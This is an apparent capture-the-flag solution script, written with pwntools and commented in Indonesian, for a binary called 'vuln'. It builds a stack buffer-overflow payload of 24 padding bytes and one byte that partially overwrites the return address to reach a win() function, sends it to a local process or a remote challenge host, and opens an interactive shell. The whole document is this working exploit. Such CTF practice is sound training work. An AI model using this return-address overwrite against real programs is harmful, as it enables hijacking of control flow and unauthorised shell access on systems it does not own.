from pwn import *

# === CONFIGURATION ===
context.arch = 'amd64'
mode = 'local' 

if mode == 'local':
    p = process('./vuln')
else:
    # Masukkan IP dan Port dari soal CTF
    p = remote('10.10.10.10', 1337)

# --- LANGKAH 1: Susun Payload ---
# Berdasarkan gambar, offset ke return address adalah 24 byte
offset = 24

# Kita hanya mengirim 25 byte total:
# 24 byte padding + 1 byte target (\xa0)
payload = b'A' * offset
payload += b'\xa0'

# --- LANGKAH 2: Kirim Payload ---
log.info(f"Mengirim payload Partial Overwrite: {len(payload)} byte")

# Menggunakan send() bukan sendline() jika program menggunakan read() 
# agar tidak ada karakter newline (\n) yang ikut terkirim
p.send(payload) 

# Jika berhasil loncat ke win(), kita akan mendapatkan shell
p.interactive()